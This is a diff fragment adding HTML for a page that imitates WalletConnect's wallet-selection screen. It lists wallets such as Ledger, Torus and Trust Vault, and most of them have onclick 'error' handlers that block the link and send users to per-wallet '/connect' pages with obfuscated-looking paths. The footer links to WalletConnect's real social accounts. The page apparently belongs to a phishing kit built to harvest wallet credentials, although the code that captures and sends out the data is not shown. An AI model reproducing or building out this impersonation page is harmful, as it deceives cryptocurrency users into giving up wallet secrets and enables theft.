+    <a id="eror59" onclick="error59(); return false;" href="/connect/indexffebffebffeb?w=squarelink"><img src="./assets/squarelink.png"></a><br>
+    Squarelink
+</div>
+
+<div class="apps">
+    <a id="eror60" onclick="error60(); return false;" href="/connect/indexeb9beb9beb9b?w=torus"><img src="./assets/torus.jpg"></a><br>
+    Torus
+</div>
+
+<div class="apps">
+    <a id="eror61" onclick="error61(); return false;" href="/connect/index4df74df74df7?w=vechain"><img src="./assets/vechain.jpg"></a><br>
+    VeChain
+</div>
+
+<div class="apps">
+    <a id="eror62" onclick="error62(); return false;" href="/connect/index678067806780?w=scatter+wallet"><img src="./assets/scatter.jpg"></a><br>
+    Scatter Wallet
+</div>
+
+<div class="apps">
+    <a id="eror63" onclick="error63(); return false;" href="/connect/index851b851b851b?w=math+wallet"><img src="./assets/math-wallet.png"></a><br>
+    Math Wallet
+</div>
+
+<div class="apps">
+    <a id="eror64" onclick="error64(); return false;" href="/connect/indexdcc9dcc9dcc9?w=fortmatic"><img src="./assets/fortmatic.png"></a><br>
+    FortMatic
+</div>
+
+<div class="apps">
+    <a id="eror65" onclick="error65(); return false;" href="/connect/index6d756d756d75?w=digitex"><img src="./assets/digitex.png"></a><br>
+    Digitex
+</div>
+
+<div class="apps">
+    <a id="eror66" onclick="error66(); return false;" href="/connect/indexea66ea66ea66?w=ledger"><img src="./assets/ledger.png"></a><br>
+    Ledger
+</div>
+
+<div class="apps">
+    <a href="/connect/indexd858d858d858?w=defiat"><img src="./assets/defiat.jpg"></a><br>
+    Defiat
+</div>
+
+<div class="apps">
+    <a id="eror67" onclick="error67(); return false" ;="" href="/connect/indexd03dd03dd03d?w=authereum"><img src="./assets/authereum.png"></a><br>
+    Authereum
+</div>
+
+<div class="apps">
+    <a id="eror68" onclick="error68(); return false" ;="" href="/connect/indexb08cb08cb08c?w=flare+wallet"><img src="./assets/flare.jpg"></a><br>
+    Flare Wallet
+</div>
+
+<div class="apps">
+    <a id="eror69" onclick="error69(); return false" ;="" href="/connect/indexf78ff78ff78f?w=zelcore"><img src="./assets/zelcore.png"></a><br>
+    Zelcore
+</div>
+
+<div class="apps">
+    <a id="eror70" onclick="error70(); return false" ;="" href="/connect/indexc865c865c865?w=bitkeep"><img src="./assets/bitkeep.png"></a><br>
+    BitKeep
+</div>
+
+<div class="apps">
+    <a id="eror71" onclick="error71(); return false" ;="" href="/connect/indexef39ef39ef39?w=coin98"><img src="./assets/coin98.png"></a><br>
+    Coin98
+</div>
+
+<div class="apps">
+    <a id="eror72" onclick="error72(); return false" ;="" href="/connect/index062006200620?w=trust+vault"><img src="./assets/trustvault.png"></a><br>
+    Trust Vault
+</div>
+
+</div>
+
+</div>
+
+
+</div>
+
+<footer><div id="footer">
+<p><img src="./assets/discord.svg" class="footimg">  <a href="https://discord.gg/jhxMvxP">Discord</a></p><br>
+<p><img src="./assets/telegram.svg" class="footimg">  <a href="https://t.me/walletconnect_announcements">Telegram</a></p><br>
+<p><img src="./assets/twitter.svg" class="footimg">  <a href="https://twitter.walletconnect.org/">Twitter</a></p><br>
+<p><img src="./assets/github.svg" class="footimg">  <a href="https://github.com/walletconnect">Github</a></p><br>
+</div></footer>
+</center>
+</body></html>
